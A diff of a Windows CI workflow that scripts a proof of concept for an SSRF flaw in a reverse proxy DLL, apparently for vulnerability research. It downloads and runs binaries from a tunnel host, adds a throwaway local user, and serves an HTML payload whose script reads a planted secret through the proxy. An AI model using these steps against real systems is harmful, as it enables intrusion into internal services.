@@ -6,38 +6,39 @@ jobs:
     runs-on: windows-latest
     timeout-minutes: 15
     steps:
-      - name: Prove low-user SSRF and browser same-origin exfiltration
+      - name: Prove low-user SSRF and browser same-origin read
         shell: pwsh
         run: |
           $ErrorActionPreference = 'Continue'
-          New-Item -ItemType Directory -Force C:\rp | Out-Null
+          New-Item -ItemType Directory -Force C:\rp\attacker,C:\rp\internal | Out-Null
+          [IO.File]::WriteAllText('C:\rp\internal\secret.txt','RESEARCHER_INTERNAL_ONLY_SECRET_4E9A77')
+          [IO.File]::WriteAllText('C:\rp\attacker\payload.html','<!doctype html><meta charset=utf-8><title>researcher</title><body>LOADING<script>fetch("/http/127.0.0.1:19091/secret.txt").then(r=>r.text()).then(x=>document.body.textContent="READ:"+x).catch(e=>document.body.textContent="ERR:"+e)</script>')
           $base = 'https://kazqn-2600-1f18-68f7-2200-aca3-814e-a7a5-3b6b.free.pinggy.net'
           curl.exe -fsSL -H 'X-Pinggy-No-Screen: 1' "$base/CsReverseProxy.dll" -o C:\rp\CsReverseProxy.dll
           curl.exe -fsSL -H 'X-Pinggy-No-Screen: 1' "$base/reverseproxy_harness.exe" -o C:\rp\reverseproxy_harness.exe
-          curl.exe -fsSL -H 'X-Pinggy-No-Screen: 1' "$base/rp_servers.py" -o C:\rp\rp_servers.py
           Get-FileHash -Algorithm SHA256 C:\rp\CsReverseProxy.dll
           Get-FileHash -Algorithm SHA256 C:\rp\reverseproxy_harness.exe
           icacls C:\rp /grant 'Users:(OI)(CI)M' /T
-          $servers = Start-Process -PassThru -WindowStyle Hidden python -ArgumentList 'C:\rp\rp_servers.py' -RedirectStandardOutput C:\rp\servers.out -RedirectStandardError C:\rp\servers.err
+          $attacker = Start-Process -PassThru -WindowStyle Hidden python -ArgumentList '-m','http.server','19090','--bind','127.0.0.1','--directory','C:\rp\attacker' -RedirectStandardOutput C:\rp\attacker.out -RedirectStandardError C:\rp\attacker.err
+          $internal = Start-Process -PassThru -WindowStyle Hidden python -ArgumentList '-m','http.server','19091','--bind','127.0.0.1','--directory','C:\rp\internal' -RedirectStandardOutput C:\rp\internal.out -RedirectStandardError C:\rp\internal.err
           $h = Start-Process -PassThru -WindowStyle Hidden C:\rp\reverseproxy_harness.exe -ArgumentList 'C:\rp\CsReverseProxy.dll','150' -RedirectStandardOutput C:\rp\harness.out -RedirectStandardError C:\rp\harness.err
           Start-Sleep 8
           '--- exact lifecycle ---'; Get-Content C:\rp\harness.err
           '--- listeners ---'; netstat -ano | Select-String '18443|19090|19091'
           '--- direct control through exact proxy ---'
-          curl.exe --noproxy '*' -sS -i --max-time 15 'http://localhost:18443/http/127.0.0.1:19091/secret'
+          curl.exe --noproxy '*' -sS -i --max-time 15 'http://localhost:18443/http/127.0.0.1:19091/secret.txt'
           '--- standard-user access ---'
-          net user rplow 'A9z!research-Only-773' /add
-          $sec=ConvertTo-SecureString 'A9z!research-Only-773' -AsPlainText -Force
+          net user rplow 'R3s!773x' /add
+          $sec=ConvertTo-SecureString 'R3s!773x' -AsPlainText -Force
           $cred=New-Object System.Management.Automation.PSCredential('.\rplow',$sec)
-          $low=Start-Process -Credential $cred -LoadUserProfile -Wait -PassThru -FilePath 'cmd.exe' -Argument '/c curl.exe --noproxy "*" -sS -i --max-time 15 http://localhost:18443/http/127.0.0.1:19091/secret > C:\rp\low.out 2>&1'
+          $low=Start-Process -Credential $cred -LoadUserProfile -Wait -PassThru -FilePath 'cmd.exe' -Argument '/c curl.exe --noproxy "*" -sS -i --max-time 15 http://localhost:18443/http/127.0.0.1:19091/secret.txt > C:\rp\low.out 2>&1'
           "low_exit=$($low.ExitCode)"; Get-Content C:\rp\low.out
-          '--- browser same-origin read and exfiltration ---'
+          '--- browser same-origin read ---'
           $chrome='C:\Program Files\Google\Chrome\Application\chrome.exe'
           & $chrome --headless --disable-gpu --no-sandbox --virtual-time-budget=8000 --dump-dom 'http://localhost:18443/http/127.0.0.1:19090/payload.html' 2>&1 | Tee-Object C:\rp\chrome.out
-          Start-Sleep 2
-          '--- exfiltrated collector body ---'
-          Get-Content C:\rp\collected.txt -ErrorAction SilentlyContinue
-          '--- server request log ---'; Get-Content C:\rp\servers.out
+          '--- browser proof marker ---'; Select-String -Path C:\rp\chrome.out -Pattern 'READ:RESEARCHER_INTERNAL_ONLY_SECRET_4E9A77'
+          '--- backend logs ---'; Get-Content C:\rp\attacker.err; Get-Content C:\rp\internal.err
           net user rplow /delete
           Stop-Process -Id $h.Id -Force -ErrorAction SilentlyContinue
-          Stop-Process -Id $servers.Id -Force -ErrorAction SilentlyContinue
+          Stop-Process -Id $attacker.Id -Force -ErrorAction SilentlyContinue
+          Stop-Process -Id $internal.Id -Force -ErrorAction SilentlyContinue
